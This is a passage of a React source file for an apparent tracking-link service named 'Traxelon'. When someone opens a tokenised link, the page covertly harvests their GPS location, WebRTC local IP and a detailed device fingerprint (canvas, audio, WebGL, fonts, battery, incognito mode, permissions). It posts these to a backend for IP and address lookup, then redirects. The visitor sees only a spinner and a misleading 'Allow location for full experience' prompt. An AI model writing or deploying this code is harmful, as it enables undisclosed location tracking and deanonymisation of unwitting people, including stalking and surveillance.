 * 3. POSTs everything to backend → backend does IP enrichment + Nominatim geocoding
 * 4. Redirects to destination URL
 */

import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";
import { UAParser } from "ua-parser-js";

// ── EXTRA: Identity + parsing helpers ─────────────────────────

function generateFingerprintId(data) {
  try {
    const str = JSON.stringify(data);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash |= 0;
    }
    return "trx_" + Math.abs(hash);
  } catch {
    return null;
  }
}

// function parseUserAgent(ua) {
//   let browser = "Unknown";
//   let os = "Unknown";

//   if (ua.includes("Edg")) browser = "Edge";
//   else if (ua.includes("Chrome")) browser = "Chrome";
//   else if (ua.includes("Firefox")) browser = "Firefox";
//   else if (ua.includes("Safari")) browser = "Safari";

//   if (ua.includes("Windows")) os = "Windows";
//   else if (ua.includes("Mac")) os = "MacOS";
//   else if (ua.includes("Android")) os = "Android";
//   else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
//   else if (ua.includes("Linux")) os = "Linux";

//   return { browser, os };
// }

// function getDeviceType() {
//   const ua = navigator.userAgent;
//   if (/tablet/i.test(ua)) return "Tablet";
//   if (/mobile/i.test(ua)) return "Mobile";
//   return "Desktop";
// }

// function getBrowserVersion() {
//   const ua = navigator.userAgent;
//   const match = ua.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
//   return match ? match[2] : null;
// }

function getPluginsList() {
  try {
    return Array.from(navigator.plugins).map(p => p.name).join(", ");
  } catch {
    return null;
  }
}

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) {
  return `traxelon_captured_v5_${token}`;
}
function getDestKey(token) {
  return `traxelon_dest_v5_${token}`;
}

// ── Canvas fingerprint ──────────────────────────────────────────────────────
function getCanvasFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Traxelon🔍", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("Traxelon🔍", 4, 17);
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      hash = (hash << 5) - hash + dataUrl.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  } catch {
    return null;
  }
}

// ── WebGL GPU info + fingerprint ────────────────────────────────────────────
function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { gpu: null, gpuVendor: null, webglRenderer: null, webglVersion: null, webglShadingLanguageVersion: null, webglExtensions: null, webglMaxTextureSize: null, webglMaxViewportDims: null };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    const extensions = gl.getSupportedExtensions() || [];
    const maxViewport = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
    return {
      gpu: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || null : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || null : null,
      webglRenderer: gl.getParameter(gl.RENDERER) || null,
      webglVendor: gl.getParameter(gl.VENDOR) || null,
      webglVersion: gl.getParameter(gl.VERSION) || null,
      webglShadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null,
      webglExtensions: extensions.length,
      webglMaxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE) || null,
      webglMaxViewportWidth: maxViewport ? maxViewport[0] : null,
      webglMaxViewportHeight: maxViewport ? maxViewport[1] : null,
      webglAntialiasing: gl.getContextAttributes()?.antialias ?? null,
    };
  } catch {
    return { gpu: null, gpuVendor: null };
  }
}

// ── Battery info ─────────────────────────────────────────────────────────────
async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return {};
    const battery = await navigator.getBattery();
    return {
      batteryLevel: Math.round(battery.level * 100),
      batteryCharging: battery.charging,
      batteryChargingTime: battery.chargingTime === Infinity ? null : battery.chargingTime,
      batteryDischargingTime: battery.dischargingTime === Infinity ? null : battery.dischargingTime,
    };
  } catch {
    return {};
  }
}

// ── Incognito detection ────────────────────────────────────────────────────
async function detectIncognito() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const { quota } = await navigator.storage.estimate();
      return quota < 120 * 1024 * 1024;
    }
    return null;
  } catch {
    return null;
  }
}

// ── Network info ─────────────────────────────────────────────────────────────
function getNetworkInfo() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!conn) return {};
  return {
    connectionType: conn.effectiveType || null,
    connectionDownlink: conn.downlink || null,
    connectionDownlinkMax: conn.downlinkMax || null,
    connectionRtt: conn.rtt || null,
    connectionSaveData: conn.saveData || false,
    connectionType2: conn.type || null,
  };
}

// ── Audio fingerprint ────────────────────────────────────────────────────────
// async function getAudioFingerprint() {
//   try {
//     const AudioContext = window.AudioContext || window.webkitAudioContext;
//     if (!AudioContext) return null;
//     const ctx = new AudioContext();
//     const oscillator = ctx.createOscillator();
//     const analyser = ctx.createAnalyser();
//     const gain = ctx.createGain();
//     const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
//     gain.gain.value = 0;
//     oscillator.type = "triangle";
//     oscillator.frequency.value = 10000;
//     oscillator.connect(analyser);
//     analyser.connect(scriptProcessor);
//     scriptProcessor.connect(gain);
//     gain.connect(ctx.destination);
//     oscillator.start(0);
//     const fingerprint = await new Promise((resolve) => {
//       scriptProcessor.onaudioprocess = (e) => {
//         const data = e.inputBuffer.getChannelData(0);
//         let sum = 0;
//         for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
//         resolve(sum.toString());
//         oscillator.stop();
//         ctx.close();
//       };
//     });
//     return fingerprint;
//   } catch {
//     return null;
//   }
// }

async function getAudioFingerprint() {
  return new Promise((resolve) => {
    try {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (!AudioContext) { resolve(null); return; }
      const ctx = new AudioContext();
      // if (ctx.state === "suspended") { ctx.close(); resolve(null); return; }
      if (ctx.state === "suspended") {
        ctx.resume();
      }
      const oscillator = ctx.createOscillator();
      const analyser = ctx.createAnalyser();
      const gain = ctx.createGain();
      const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
      gain.gain.value = 0;
      oscillator.type = "triangle";
      oscillator.frequency.value = 10000;
      oscillator.connect(analyser);
      analyser.connect(scriptProcessor);
      scriptProcessor.connect(gain);
      gain.connect(ctx.destination);
      oscillator.start(0);
      scriptProcessor.onaudioprocess = (e) => {
        const data = e.inputBuffer.getChannelData(0);
        let sum = 0;
        for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
        resolve(sum.toString());
        oscillator.stop();
        ctx.close();
      };
      // Timeout fallback — if audio never processes, resolve null after 2s
      setTimeout(() => resolve(null), 2000);
    } catch {
      resolve(null);
    }
  });
}

// ── Font detection ───────────────────────────────────────────────────────────
function getAvailableFonts() {
  try {
    const testFonts = [
      "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria",
      "Comic Sans MS", "Courier New", "Georgia", "Helvetica", "Impact",
      "Lucida Console", "Lucida Sans Unicode", "Microsoft Sans Serif",
      "Palatino Linotype", "Segoe UI", "Tahoma", "Times New Roman",
      "Trebuchet MS", "Verdana", "Roboto", "Open Sans", "Lato",
      "Montserrat", "Ubuntu", "Noto Sans", "Noto Serif",
    ];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const baseFonts = ["monospace", "sans-serif", "serif"];
    const testString = "mmmmmmmmmmlli";
    const testSize = "72px";
    const baseWidths = {};
    baseFonts.forEach((baseFont) => {
      ctx.font = `${testSize} ${baseFont}`;
      baseWidths[baseFont] = ctx.measureText(testString).width;
    });
    const available = testFonts.filter((font) =>
      baseFonts.some((baseFont) => {
        ctx.font = `${testSize} '${font}', ${baseFont}`;
        return ctx.measureText(testString).width !== baseWidths[baseFont];
      })
    );
    return available.length;
  } catch {
    return null;
  }
}

// ── Media devices ────────────────────────────────────────────────────────────
async function getMediaDevices() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return {};
    const devices = await navigator.mediaDevices.enumerateDevices();
    return {
      audioInputCount: devices.filter(d => d.kind === "audioinput").length,
      audioOutputCount: devices.filter(d => d.kind === "audiooutput").length,
      videoInputCount: devices.filter(d => d.kind === "videoinput").length,
    };
  } catch {
    return {};
  }
}

// ── Storage info ──────────────────────────────────────────────────────────────
async function getStorageInfo() {
  try {
    if (!navigator.storage || !navigator.storage.estimate) return {};
    const { quota, usage } = await navigator.storage.estimate();
    return {
      storageQuota: quota ? Math.round(quota / 1024 / 1024) : null,
      storageUsage: usage ? Math.round(usage / 1024 / 1024) : null,
    };
  } catch {
    return {};
  }
}

async function getWebRTCIP() {
  return new Promise((resolve) => {
    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer));

      pc.onicecandidate = (event) => {
        if (!event || !event.candidate) return;
        const ip = event.candidate.candidate.split(" ")[4];
        resolve(ip);
      };

      setTimeout(() => resolve(null), 2000);
    } catch {
      resolve(null);
    }
  });
}

function getNavigatorExtras() {
  return {
    pluginsCount: navigator.plugins ? navigator.plugins.length : null,
    mimeTypesCount: navigator.mimeTypes ? navigator.mimeTypes.length : null,
  };
}

function detectAdblock() {
  try {
    const bait = document.createElement("div");
    bait.className = "adsbox";
    bait.style.height = "1px";
    document.body.appendChild(bait);

    const blocked = bait.offsetHeight === 0;

    document.body.removeChild(bait);
    return blocked;
  } catch {
    return null;
  }
}

function getInputCapabilities() {
  return {
    maxTouchPoints: navigator.maxTouchPoints || 0,
    hasTouch: "ontouchstart" in window,
    pointerFine: window.matchMedia("(pointer: fine)").matches,
    pointerCoarse: window.matchMedia("(pointer: coarse)").matches,
  };
}

// ── Browser permissions ───────────────────────────────────────────────────────
async function getPermissions() {
  const check = async (name) => {
    try {
      const result = await navigator.permissions.query({ name });
      return result.state;
    } catch {
      return null;
    }
  };
  try {
    const [camera, microphone, notifications, geolocation, clipboard] = await Promise.all([
      check("camera"),
      check("microphone"),
      check("notifications"),
      check("geolocation"),
      check("clipboard-read"),
    ]);
    return { permCamera: camera, permMicrophone: microphone, permNotifications: notifications, permGeolocation: geolocation, permClipboard: clipboard };
  } catch {
    return {};
  }
}

// ── Browser feature detection ─────────────────────────────────────────────────
function getBrowserFeatures() {
  return {
    // APIs available
    hasServiceWorker: "serviceWorker" in navigator,
    hasWebWorker: typeof Worker !== "undefined",
    hasWebSocket: typeof WebSocket !== "undefined",
    hasIndexedDB: !!window.indexedDB,
    hasWebRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
    hasCanvas: !!document.createElement("canvas").getContext,
    hasWebGL: (() => { try { return !!document.createElement("canvas").getContext("webgl"); } catch { return false; } })(),
    hasWebGL2: (() => { try { return !!document.createElement("canvas").getContext("webgl2"); } catch { return false; } })(),
    hasBluetooth: !!navigator.bluetooth,
    hasUSB: !!navigator.usb,
    hasNFC: !!navigator.nfc,
    hasGamepad: !!navigator.getGamepads,
    hasVibration: !!navigator.vibrate,
    hasGeolocation: !!navigator.geolocation,
    hasBattery: !!navigator.getBattery,
    hasDeviceMemory: !!navigator.deviceMemory,
    hasHardwareConcurrency: !!navigator.hardwareConcurrency,
    hasCredentials: !!navigator.credentials,
    hasShare: !!navigator.share,
    hasClipboard: !!navigator.clipboard,
    hasWakeLock: !!navigator.wakeLock,
    hasSpeechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
    hasSpeechSynthesis: !!window.speechSynthesis,
    hasPaymentRequest: !!window.PaymentRequest,
    hasNotification: !!window.Notification,
    hasPushManager: !!window.PushManager,
    hasCrypto: !!window.crypto,
    hasPerformance: !!window.performance,
    hasIntersectionObserver: !!window.IntersectionObserver,
    hasResizeObserver: !!window.ResizeObserver,
    hasMutationObserver: !!window.MutationObserver,
    hasRequestAnimationFrame: !!window.requestAnimationFrame,
    hasFetch: !!window.fetch,
    hasLocalStorage: (() => { try { localStorage.setItem("t", "1"); localStorage.removeItem("t"); return true; } catch { return false; } })(),
    hasSessionStorage: (() => { try { sessionStorage.setItem("t", "1"); sessionStorage.removeItem("t"); return true; } catch { return false; } })(),
  };
}

// ── Screen & display details ──────────────────────────────────────────────────
function getScreenDetails() {
  return {
    screenOrientation: window.screen.orientation?.type || null,
    screenOrientationAngle: window.screen.orientation?.angle ?? null,
    isFullscreen: !!document.fullscreenElement,
    documentVisibility: document.visibilityState || null,
    screenIsExtended: window.screen.isExtended ?? null,
  };
}

// ── Performance & timing ──────────────────────────────────────────────────────
function getPerformanceInfo() {
  try {
    const nav = performance.getEntriesByType("navigation")[0];
    return {
      pageLoadTime: nav ? Math.round(nav.loadEventEnd - nav.fetchStart) : null,
      domContentLoaded: nav ? Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) : null,
      timeToFirstByte: nav ? Math.round(nav.responseStart - nav.fetchStart) : null,
      deviceMemoryHeap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) : null,
      usedJSHeap: performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) : null,
    };
  } catch {
    return {};
  }
}

// ── Timezone & locale ────────────────────────────────────────────────────────
function getTimezoneInfo() {
  try {
    const tz = Intl.DateTimeFormat().resolvedOptions();
    return {
      timezone: tz.timeZone || null,
      timezoneOffset: new Date().getTimezoneOffset(),
      locale: tz.locale || navigator.language || null,
      hourCycle: tz.hourCycle || null,
      calendar: tz.calendar || null,
      numberingSystem: tz.numberingSystem || null,
    };
  } catch {
    return {};
  }
}

// ── Math fingerprint (detects OS/CPU via floating point differences) ──────────
function getMathFingerprint() {
  try {
    return {
      mathSin: Math.sin(1),
      mathCos: Math.cos(1),
      mathTan: Math.tan(1),
      mathLog: Math.log(5),
      mathSqrt: Math.sqrt(2),
      mathAsin: Math.asin(0.5),
      mathSinh: Math.sinh(1),
      mathCosh: Math.cosh(1),
      mathExpm1: Math.expm1(1),
    };
  } catch {
    return {};
  }
}

// ── Timeout helper ─────────────────────────────────────────
function withTimeout(promise, ms = 1500, fallback = null) {
  return Promise.race([
    promise,
    new Promise(resolve => setTimeout(() => resolve(fallback), ms))
  ]);
}

// ── Collect ALL device info ───────────────────────────────────────────────────
async function collectDeviceInfo() {
  try {
    const [battery, incognito, mediaDevices, storageInfo, permissions, audioFingerprint, webRTCIP] = await Promise.all([
      withTimeout(getBatteryInfo(), 3000, {}),
      withTimeout(detectIncognito(), 2000, null),
      withTimeout(getMediaDevices(), 3000, {}),
      withTimeout(getStorageInfo(), 2000, {}),
      withTimeout(getPermissions(), 3000, {}),
      withTimeout(getAudioFingerprint(), 2000, null),
      withTimeout(getWebRTCIP(), 2000, null),
    ]);

    const gpuInfo = getGPUInfo();
    const network = getNetworkInfo();
    const canvasHash = getCanvasFingerprint();
    const features = getBrowserFeatures();
    const screenDetails = getScreenDetails();
    const perfInfo = getPerformanceInfo();
    const tzInfo = getTimezoneInfo();
    const mathFP = getMathFingerprint();
    const fontCount = getAvailableFonts();
    const parser = new UAParser();
    const result = parser.getResult();

    // const parsed = parseUserAgent(navigator.userAgent);

    const fingerprintBase = {
      userAgent: navigator.userAgent,
      screen: `${window.screen.width}x${window.screen.height}`,
      gpu: gpuInfo.gpu,
      cpu: navigator.hardwareConcurrency,
      ram: navigator.deviceMemory,
      platform: navigator.platform,
    };

    const fingerprintId = generateFingerprintId(fingerprintBase);

    return {
      // ── Hardware ──
      cpuCores: navigator.hardwareConcurrency || null,
      ram: navigator.deviceMemory || null,
      maxTouchPoints: navigator.maxTouchPoints ?? null,
      ...gpuInfo,

      // ── Battery ──
      batteryLevel: battery.batteryLevel ?? null,
      batteryCharging: battery.batteryCharging ?? null,
      batteryChargingTime: battery.batteryChargingTime ?? null,
      batteryDischargingTime: battery.batteryDischargingTime ?? null,

      // ── Screen & Display ──
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      screenAvailWidth: window.screen.availWidth || null,
      screenAvailHeight: window.screen.availHeight || null,
      colorDepth: window.screen.colorDepth || null,
      pixelDepth: window.screen.pixelDepth || null,
      pixelRatio: window.devicePixelRatio || null,
      windowWidth: window.innerWidth || null,
      windowHeight: window.innerHeight || null,
      outerWidth: window.outerWidth || null,
      outerHeight: window.outerHeight || null,
      screenX: window.screenX ?? null,
      screenY: window.screenY ?? null,
      ...screenDetails,

      // ── Browser ──
      language: navigator.language || null,
      languages: navigator.languages ? navigator.languages.join(", ") : null,
      platform: navigator.platform || null,
      cookiesEnabled: navigator.cookieEnabled ?? null,
      doNotTrack: navigator.doNotTrack || null,
      historyLength: window.history.length || null,
      referrer: document.referrer || null,
      userAgent: navigator.userAgent || null,
      appName: navigator.appName || null,
      appVersion: navigator.appVersion || null,
      appCodeName: navigator.appCodeName || null,
      product: navigator.product || null,
      productSub: navigator.productSub || null,
      vendor: navigator.vendor || null,
      vendorSub: navigator.vendorSub || null,
      onLine: navigator.onLine ?? null,
      pdfViewerEnabled: navigator.pdfViewerEnabled ?? null,
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
      documentTitle: document.title || null,
      documentCharset: document.characterSet || null,
      documentCompatMode: document.compatMode || null,
      documentReadyState: document.readyState || null,

      // ── Network ──
      ...network,

      // ── Timezone & Locale ──
      ...tzInfo,

      // ── Storage ──
      ...storageInfo,

      // ── Media Devices ──
      ...mediaDevices,

      // ── Permissions ──
      ...permissions,

      // ── Performance ──
      ...perfInfo,

      // ── Privacy ──
      incognito: incognito ?? null,

      // ── Browser Features ──
      ...features,

      // ── Fingerprints ──
      canvasHash,
      audioFingerprint,
      fontCount,

      // ── Math fingerprint ──
      ...mathFP,

      // ── WebRTC ──
      webRTCIP,

      // ── Navigator extras ──
      ...getNavigatorExtras(),

      // ── Input / Touch ──
      ...getInputCapabilities(),

      // ── Adblock ──
      adBlockEnabled: detectAdblock(),

      // ── CSS Media Queries ──
      prefersColorScheme: window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
      prefersReducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
      prefersContrast: window.matchMedia("(prefers-contrast: high)").matches ? "high" : "normal",
      forcedColors: window.matchMedia("(forced-colors: active)").matches,
      hoverCapability: window.matchMedia("(hover: hover)").matches ? "hover" : "none",
      pointerType: window.matchMedia("(pointer: coarse)").matches ? "coarse" : window.matchMedia("(pointer: fine)").matches ? "fine" : "none",
      anyHover: window.matchMedia("(any-hover: hover)").matches,
      anyPointer: window.matchMedia("(any-pointer: coarse)").matches ? "coarse" : "fine",
      displayMode: window.matchMedia("(display-mode: standalone)").matches ? "standalone" : window.matchMedia("(display-mode: fullscreen)").matches ? "fullscreen" : "browser",

      // ── Page Context ──
      pageUrl: window.location.href || null,
      pageHostname: window.location.hostname || null,
      pageProtocol: window.location.protocol || null,
      pagePathname: window.location.pathname || null,
      pageSearch: window.location.search || null,
      pageHash: window.location.hash || null,
      scrollX: window.scrollX ?? null,
      scrollY: window.scrollY ?? null,
      deviceScaleFactor: window.devicePixelRatio || null,

      // ── NEW: Clean identity info ──
      fingerprintId,

      device: result.device.type || "Desktop",
      browser: result.browser.name,
      browserVersion: result.browser.version,
      os: result.os.name,

      // ── NEW: Extra environment detail ──
      plugins: getPluginsList(),
      timezoneOffsetMinutes: new Date().getTimezoneOffset(),
      screenOrientationType: window.screen.orientation?.type || null,
      screenOrientationAngle: window.screen.orientation?.angle ?? null,
      colorGamut: window.matchMedia("(color-gamut: p3)").matches ? "p3" : "srgb",
    };
  } catch (err) {
    console.error("collectDeviceInfo failed:", err);
    return {}; // ← VERY IMPORTANT
  }
}

// ─────────────────────────────────────────────────────────────────────────────

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("📍 Allow location for full experience…");
  const hasSent = useRef(false);

  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) {
      const savedUrl = sessionStorage.getItem(getDestKey(token));
      if (savedUrl) {
        window.location.replace(savedUrl);
      } else {
        setStatus("⚠️ Link not found or has expired.");
      }
    }
  }, [token]);

  useEffect(() => {
    if (loading) return;
    if (hasSent.current) return;
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return;

    hasSent.current = true;
    sessionStorage.setItem(key, "1");
    sendCapture(location);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [loading]);

  async function sendCapture(loc) {
    setStatus("Redirecting…");
    let destinationUrl = null;

    try {
      const deviceInfoPromise = collectDeviceInfo();
      const deviceInfo = await deviceInfoPromise;

      const payload = {
        token,
        gpsLat: loc?.source === "gps" ? (loc?.lat ?? null) : null,
        gpsLon: loc?.source === "gps" ? (loc?.lon ?? null) : null,
        gpsAccuracy: loc?.source === "gps" ? (loc?.gpsAccuracy ?? null) : null,
        ...deviceInfo,
      };
      console.log("🚀 PAYLOAD:", payload);

      const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      destinationUrl = data?.destinationUrl ?? null;
    } catch (err) {
      console.error("[TrackingCapture] error:", err);
      setStatus("⚠️ Could not reach the destination. The link may be invalid or expired.");
      return;
    }

    if (destinationUrl) {
      sessionStorage.setItem(getDestKey(token), destinationUrl);
      window.location.replace(destinationUrl);
    } else {
      setStatus("⚠️ Link not found or has expired. Please check the link and try again.");
    }
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        background: "#ffffff",
        fontFamily: "sans-serif",
      }}
    >
      <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
        <div
          style={{
            width: 36,
            height: 36,
            border: "3px solid #f0f0f0",
            borderTop: "3px solid #4a90e2",
            borderRadius: "50%",
            margin: "0 auto 16px",
            animation: "spin 0.9s linear infinite",
          }}
        />
        <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}